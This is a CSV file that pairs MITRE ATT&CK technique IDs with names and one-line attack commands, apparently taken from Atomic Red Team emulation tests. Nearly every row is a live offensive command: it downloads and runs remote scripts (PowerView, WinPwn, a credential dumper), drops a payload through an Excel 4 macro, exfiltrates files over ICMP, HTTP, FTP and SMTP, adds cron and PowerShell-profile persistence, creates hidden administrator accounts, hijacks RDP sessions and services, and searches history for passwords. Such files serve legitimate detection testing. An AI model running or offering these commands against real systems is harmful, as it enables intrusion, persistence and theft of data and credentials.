mitre_id,technique_name,command
T1204,Excel 4 Macro,"$fname = ""$env:temp\atomic_redteam_x4m_exec.vbs"" $fname1 = ""$env:temp\procexp.exe"" if (test-path $fname) { remove-item $fname remove-item $fname1 } $xlapp = new-object -comobject ""excel.application"" $xlapp.visible = $true $xlapp.displayalerts = $false $xlbook = $xlapp.workbooks.add() $sheet = $xlbook.excel4macrosheets.add() if (""#{uname}"" -ne """") { $sheet.cells.item(1,1) = ""#{uname}"" } else { $sheet.cells.item(1,1) = ""=get.workspace(26)"" } $sheet.cells.item(2,1) = ""procexp.exe"" $sheet.cells.item(3,1) = ""atomic_redteam_x4m_exec.vbs"" $sheet.cells.item(4,1) = ""=if(isnumber(search(`""64`"",get.workspace(1))), goto(a5),)"" $sheet.cells.item(5,1) = ""=fopen(`""c:\users\`""&a1&`""\appdata\local\temp\`""&a3&`""`"", 3)"" $sheet.cells.item(6,1) = ""=fwriteln(a5, `""url = `""`""#{download_url}`""`""`"")"" $sheet.cells.item(7,1) = ""=fwriteln(a5, `""`"")"" $sheet.cells.item(8,1) = ""=fwriteln(a5, `""set winhttp = createobject(`""`""winhttp.winhttprequest.5.1`""`"")`"")"" $sheet.cells.item(9,1) = ""=fwriteln(a5, `""winhttp.open `""`""get`""`"", url, false`"")"" $sheet.cells.item(10,1) = ""=fwriteln(a5, `""winhttp.send`"")"" $sheet.cells.item(11,1) = ""=fwriteln(a5, `""if winhttp.status = 200 then`"")"" $sheet.cells.item(12,1) = ""=fwriteln(a5, `""set ostream = createobject(`""`""adodb.stream`""`"")`"")"" $sheet.cells.item(13,1) = ""=fwriteln(a5, `""ostream.open`"")"" $sheet.cells.item(14,1) = ""=fwriteln(a5, `""ostream.type = 1`"")"" $sheet.cells.item(15,1) = ""=fwriteln(a5, `""ostream.write winhttp.responsebody`"")"" $sheet.cells.item(16,1) = ""=fwriteln(a5, `""ostream.savetofile `""`""c:\users\`""&a1&`""\appdata\local\temp\`""&a2&`""`""`"", 2`"")"" $sheet.cells.item(17,1) = ""=fwriteln(a5, `""ostream.close`"")"" $sheet.cells.item(18,1) = ""=fwriteln(a5, `""end if`"")"" $sheet.cells.item(19,1) = ""=fclose(a5)"" $sheet.cells.item(20,1) = ""=exec(`""explorer.exe c:\users\`""&a1&`""\appdata\local\temp\`""&a3&`""`"")"" $sheet.cells.item(21,1) = ""=wait(now()+`""00:00:05`"")"" $sheet.cells.item(22,1) = ""=exec(`""explorer.exe c:\users\`""&a1&`""\appdata\local\temp\`""&a2&`""`"")"" $sheet.cells.item(23,1) = ""=halt()"" $sheet.cells.item(1,1).name = ""runme"" $xlapp.run(""runme"") $xlapp.quit() [system.runtime.interopservices.marshal]::releasecomobject($xlbook) | out-null [system.runtime.interopservices.marshal]::releasecomobject($xlapp) | out-null [system.gc]::collect() [system.gc]::waitforpendingfinalizers() remove-variable xlbook remove-variable xlapp"
T1204,Headless Chrome code execution via VBA,"[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/t1204.002/src/invoke-maldoc.ps1"" -usebasicparsing) invoke-maldoc -macrofile ""pathtoatomicsfolder\t1204.002\src\chromeexec-macrocode.txt"" -officeproduct ""word"" -sub ""execchrome"""
T1204,Potentially Unwanted Applications (PUA),"invoke-webrequest #{pua_url} -outfile #{pua_file} & ""#{pua_file}"""
T1204,Office Generic Payload Download,"[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/t1204.002/src/invoke-maldoc.ps1"" -usebasicparsing) $macrocode = get-content ""#{macro_path}"" -raw $url = ""#{c2_domain}"" + ""/"" + ""#{c2_parent_directory}"" $macrocode = $macrocode -replace 'serverpath', $url -replace 'filename', ""#{file_name}"" invoke-maldoc -macrocode $macrocode -officeproduct ""#{ms_product}"""
T1204,LNK Payload Download,"invoke-webrequest -outfile $env:temp\test10.lnk ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/t1204.002/bin/test10.lnk"" $file1 = ""$env:temp\test10.lnk"" start-process $file1 start-sleep -s 10 taskkill /im a.exe /f"
T1204,Mirror Blast Emulation,"cd ""c:\programdata\microsoft\windows\start menu\programs"" new-itemproperty -path registry::hkey_current_user\software\microsoft\office\16.0\excel\security -name ""vbawarnings"" -value ""1"" -propertytype dword -force | out-null & '.\excel 2016.lnk' ""pathtoatomicsfolder\t1204.002\bin\mirrorblast_emulation.xlsm"""
T1204,ClickFix Campaign - Abuse RunMRU to Launch mshta via PowerShell,"set-itemproperty -path ""hkcu:\software\microsoft\windows\currentversion\explorer\runmru"" -name ""atomictest"" -value '""c:\windows\system32\mshta.exe"" http://localhost/hello6.hta'"
T1204,Simulate Click-Fix via Downloaded BAT File,"$url = ""#{url}"" $outfile = ""#{outfile}"" invoke-webrequest -uri $url -outfile $outfile -usebasicparsing $process = start-process -filepath $outfile -passthru -windowstyle normal $process.id | out-file ""$env:temp\click-fix-pid.txt"""
T1053,Cron - Replace crontab with referenced file,"crontab -l > /tmp/notevil echo ""* * * * * #{command}"" > #{tmp_cron} && crontab #{tmp_cron}"
T1053,Cron - Add script to all cron subfolders,"echo ""#{command}"" > /etc/cron.daily/#{cron_script_name} echo ""#{command}"" > /etc/cron.hourly/#{cron_script_name} echo ""#{command}"" > /etc/cron.monthly/#{cron_script_name} echo ""#{command}"" > /etc/cron.weekly/#{cron_script_name}"
T1053,Cron - Add script to /etc/cron.d folder,"echo ""#{command}"" > /etc/cron.d/#{cron_script_name}"
T1053,Cron - Add script to /var/spool/cron/crontabs/ folder,"echo ""#{command}"" >> /var/spool/cron/crontabs/#{cron_script_name}"
T1555,Access Saved Credentials via VaultCmd,"vaultcmd /listcreds:""windows credentials"""
T1555,WinPwn - Loot local Credentials - Invoke-WCMDump,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/creds/master/obfuscatedps/dumpwcm.ps1') invoke-wcmdump
T1176,Google Chrome Load Unpacked Extension With Command Line,"# chromium $chromium = ""https://commondatastorage.googleapis.com/chromium-browser-snapshots/win_x64/1153778/chrome-win.zip"" # ublock origin lite to test side-loading $extension = ""https://github.com/ublockorigin/ubol-home/releases/download/ubolite_2024.11.25.1376/ubolite_2024.11.25.1376.chromium.mv3.zip"" set-location ""#{working_dir}"" set-variable progresspreference silentlycontinue invoke-webrequest -uri $chromium -outfile ""#{working_dir}\chrome.zip"" invoke-webrequest -uri $extension -outfile ""#{working_dir}\extension.zip"" expand-archive chrome.zip -destinationpath ""#{working_dir}"" -force expand-archive extension.zip -force start-process .\chrome-win\chrome.exe --load-extension=""#{working_dir}\extension\"" -passthru"
T1546,Append malicious start-process cmdlet,"add-content #{ps_profile} -value """" add-content #{ps_profile} -value ""start-process #{exe_path}"" powershell -command exit"
T1201,Examine password complexity policy - Ubuntu,cat /etc/pam.d/common-password
T1201,Examine password complexity policy - FreeBSD,cat /etc/pam.d/passwd
T1201,Examine password complexity policy - CentOS/RHEL 7.x,cat /etc/security/pwquality.conf
T1201,Examine password complexity policy - CentOS/RHEL 6.x,cat /etc/pam.d/system-auth cat /etc/security/pwquality.conf
T1201,Examine password expiration policy - All Linux,cat /etc/login.defs
T1201,Examine local password policy - Windows,net accounts
T1201,Examine domain password policy - Windows,net accounts /domain
T1201,Examine password policy - macOS,pwpolicy getaccountpolicies
T1201,Get-DomainPolicy with PowerView,[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr 'https://raw.githubusercontent.com/powershellmafia/powersploit/master/recon/powerview.ps1' -usebasicparsing); get-domainpolicy -verbose
T1201,Enumerate Active Directory Password Policy with get-addefaultdomainpasswordpolicy,get-addefaultdomainpasswordpolicy
T1201,Use of SecEdit.exe to export the local security policy (including the password policy),secedit.exe /export /areas securitypolicy /cfg output_mysecpol.txt
T1201,Examine AWS Password Policy,aws iam get-account-password-policy
T1048,Exfiltration Over Alternative Protocol - ICMP,"$ping = new-object system.net.networkinformation.ping; foreach($data in get-content -path #{input_file} -encoding byte -readcount 1024) { $ping.send(""#{ip_address}"", 1500, $data) }"
T1048,Exfiltration Over Alternative Protocol - HTTP,$content = get-content #{input_file} invoke-webrequest -uri #{ip_address} -method post -body $content
T1048,Exfiltration Over Alternative Protocol - SMTP,"send-mailmessage -from #{sender} -to #{receiver} -subject ""t1048.003 atomic test"" -attachments #{input_file} -smtpserver #{smtp_server}"
T1048,MAZE FTP Upload,"$dir_to_copy = ""$env:windir\temp"" $ftp = ""ftp://#{ftp_server}/"" $web_client = new-object system.net.webclient $web_client.credentials = new-object system.net.networkcredential('#{username}', '#{password}') if (test-connection -count 1 -computername ""#{ftp_server}"" -quiet) {foreach($file in (dir $dir_to_copy ""*.7z"")) {echo ""uploading $file..."" $uri = new-object system.uri($ftp+$file.name) $web_client.uploadfile($uri, $file.fullname)}} else {echo ""ftp server unreachable. please verify the server address in input args and try again.""}"
T1048,Exfiltration Over Alternative Protocol - FTP - Rclone,"$rclone_bin = get-childitem c:\users\public\downloads\ -recurse -include ""rclone.exe"" | select-object -expandproperty fullname $exfil_pack = get-childitem c:\users\public\downloads\ -recurse -include ""exfil.zip"" | select-object -expandproperty fullname &$rclone_bin config create ftpserver ""ftp"" ""host"" #{ftp_server} ""port"" #{ftp_port} ""user"" #{ftp_user} ""pass"" #{ftp_pass} &$rclone_bin copy --max-age 2y $exfil_pack ftpserver --bwlimit 2m -q --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 12 -p --ftp-no-check-certificate"
T1048,Python3 http.server,"[ ""$(uname)"" = 'freebsd' ] && alias python3=python3.9 if [ $(which python3) ]; then cd /tmp; python3 -m http.server 9090 & pid=$!; sleep 10; kill $pid; unset pid; fi"
T1552,AWS - Retrieve EC2 Password Data using stratus,"export aws_region=#{aws_region} cd #{stratus_path} echo ""starting warmup"" ./stratus warmup aws.credential-access.ec2-get-password-data echo ""starting detonate"" ./stratus detonate aws.credential-access.ec2-get-password-data --force"
T1552,Search for Passwords in Powershell History,"ls -r c:\users\*\appdata\roaming\microsoft\windows\powershell\psreadline\consolehost_history.txt | select-string ""password"", ""-p"", ""key"", ""pwd"", ""pass"""
T1615,Display group policy information via gpresult,gpresult /z
T1615,Get-DomainGPO to display group policy information via PowerView,"powershell -nop -exec bypass -c ""iex (new-object net.webclient).downloadstring('https://github.com/bc-security/empire/blob/86921fbbf4945441e2f9d9e7712c5a6e96eed0f3/empire/server/data/module_source/situational_awareness/network/powerview.ps1'); get-domaingpo"""
T1615,WinPwn - GPOAudit,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/winpwn/121dcee26a7aca368821563cbe92b2b5638c5773/winpwn.ps1') gpoaudit -noninteractive -consoleoutput
T1615,WinPwn - GPORemoteAccessPolicy,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/winpwn/121dcee26a7aca368821563cbe92b2b5638c5773/winpwn.ps1') gporemoteaccesspolicy -consoleoutput -noninteractive
T1615,MSFT Get-GPO Cmdlet,get-gpo -domain $env:userdnsdomain #{gpo_param} >> #{gpo_output}
T1574,Service Registry Permissions Weakness,get-acl registry::hklm\system\currentcontrolset\services\* |fl get-acl registry::hklm\system\currentcontrolset\services\#{weak_service_name} |fl
T1574,Service ImagePath Change with reg.exe,"reg.exe add ""hklm\system\currentcontrolset\services\#{weak_service_name}"" /f /v imagepath /d ""#{malicious_service_path}"""
T1040,Packet Capture Linux using tshark or tcpdump,tcpdump -c 5 -nnni #{interface} tshark -c 5 -i #{interface}
T1040,Packet Capture FreeBSD using tshark or tcpdump,tcpdump -c 5 -nnni #{interface} tshark -c 5 -i #{interface}
T1040,Packet Capture macOS using tcpdump or tshark,"sudo tcpdump -c 5 -nnni #{interface} if [ -x ""$(command -v tshark)"" ]; then sudo tshark -c 5 -i #{interface}; fi;"
T1040,Packet Capture Windows Command Prompt,"""c:\program files\wireshark\tshark.exe"" -i #{interface} -c 5"
T1040,Windows Internal Packet Capture,netsh trace start capture=yes tracefile=%temp%\trace.etl maxsize=10
T1040,Windows Internal pktmon capture,pktmon.exe start --etw -f %temp%\t1040.etl timeout /t 5 >nul 2>&1 pktmon.exe stop
T1040,Windows Internal pktmon set filter,pktmon.exe filter add -p 445
T1040,Packet Capture macOS using /dev/bpfN with sudo,sudo #{program_path} -i #{ifname} -t 3
T1040,Filtered Packet Capture macOS using /dev/bpfN with sudo,sudo #{program_path} -f -i #{ifname} -t 3
T1040,Packet Capture FreeBSD using /dev/bpfN with sudo,sudo #{program_path} -i #{ifname} -t 3
T1040,Filtered Packet Capture FreeBSD using /dev/bpfN with sudo,sudo #{program_path} -f -i #{ifname} -t 3
T1040,"Packet Capture Linux socket AF_PACKET,SOCK_RAW with sudo",sudo #{program_path} -a -t 3
T1040,"Packet Capture Linux socket AF_INET,SOCK_RAW,TCP with sudo",sudo #{program_path} -4 -p 6 -t 3
T1040,"Packet Capture Linux socket AF_INET,SOCK_PACKET,UDP with sudo",sudo #{program_path} -4 -p -p 17 -t 3
T1040,"Packet Capture Linux socket AF_PACKET,SOCK_RAW with BPF filter for UDP with sudo",sudo #{program_path} -a -f -t 3
T1040,PowerShell Network Sniffing,"new-neteventsession -name capture007 -localfilepath ""$env:temp\sniff.etl"" add-neteventpacketcaptureprovider -sessionname capture007 -truncationlength 100 start-neteventsession -name capture007 stop-neteventsession -name capture007 remove-neteventsession -name capture007"
T1563,RDP hijacking,"query user sc.exe create sesshijack binpath= ""cmd.exe /k tscon #{session_id} /dest:#{destination_id}"" net start sesshijack"
T1027,Pad Binary to Change Hash - Linux/macOS dd,dd if=/dev/zero bs=1 count=1 >> #{file_to_pad} #adds null bytes dd if=/dev/random bs=1 count=1 >> #{file_to_pad} #adds high-quality random data dd if=/dev/urandom bs=1 count=1 >> #{file_to_pad} #adds low-quality random data
T1027,Pad Binary to Change Hash using truncate command - Linux/macOS,truncate -s +1 #{file_to_pad} #adds a byte to the file size
T1564,Extract binary files via VBA,"$macro = [system.io.file]::readalltext(""pathtoatomicsfolder\t1564\src\t1564-macrocode.txt"") $macro = $macro -replace ""areplacemea"", ""pathtoatomicsfolder\t1564\bin\extractme.bin"" [net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/t1204.002/src/invoke-maldoc.ps1"" -usebasicparsing) invoke-maldoc -macrocode ""$macro"" -officeproduct ""word"" -sub ""extract"" -nowrap"
T1564,"Create a Hidden User Called ""$""",net user $ atomic123! /add /active:yes
T1564,"Create an ""Administrator "" user (with a space on the end)","new-localuser -name ""administrator "" -nopassword"
T1564,Create and Hide a Service with sc.exe,"sc.exe create #{service_name} binpath= ""#{executable_command}"" sc sdset #{service_name} ""d:(d;;dclcwpdtsd;;;iu)(d;;dclcwpdtsd;;;su)(d;;dclcwpdtsd;;;ba)(a;;cclcswlocrrc;;;iu)(a;;cclcswlocrrc;;;su)(a;;cclcswrpwpdtlocrrc;;;sy)(a;;ccdclcswrpwpdtlocrsdrcwdwo;;;ba)s:(au;fa;ccdclcswrpwpdtlocrsdrcwdwo;;;wd)"""
T1564,Command Execution with NirCmd,"cmd /c ""#{nircmd_location}"" #{command_to_execute}"
T1140,Deobfuscate/Decode Files Or Information,certutil -encode #{executable} %temp%\t1140_calc.txt certutil -decode %temp%\t1140_calc.txt %temp%\t1140_calc_decoded.exe
T1140,Certutil Rename and Decode,copy %windir%\system32\certutil.exe %temp%\tcm.tmp %temp%\tcm.tmp -encode #{executable} %temp%\t1140_calc2.txt %temp%\tcm.tmp -decode %temp%\t1140_calc2.txt %temp%\t1140_calc2_decoded.exe
T1140,Base64 decoding with Python,"encoded=$(python3 -c 'import base64;enc=base64.b64encode(""#{message}"".encode());print(enc.decode())') python3 -c ""import base64;dec=base64.b64decode(\""$encoded\"");print(dec.decode())"" python3 -c ""import base64 as d;dec=d.b64decode(\""$encoded\"");print(dec.decode())"" python3 -c ""from base64 import b64decode;dec=b64decode(\""$encoded\"");print(dec.decode())"" python3 -c ""from base64 import b64decode as d;dec=d(\""$encoded\"");print(dec.decode())"" echo $encoded | python3 -c ""import base64,sys;dec=base64.b64decode(sys.stdin.read());print(dec.decode())"" echo $encoded > #{encoded_file} && python3 -c ""import base64;dec=base64.b64decode(open('#{encoded_file}').read());print(dec.decode())"""
T1140,Base64 decoding with Perl,"encoded=$(perl -e ""use mime::base64;print(encode_base64('#{message}'));"") perl -le ""use mime::base64;print(decode_base64('$encoded'));"" echo $encoded | perl -le 'use mime::base64;print(decode_base64(<stdin>));' echo $encoded > #{encoded_file} && perl -le 'use mime::base64;open($f,""<"",""#{encoded_file}"");print(decode_base64(<$f>));'"
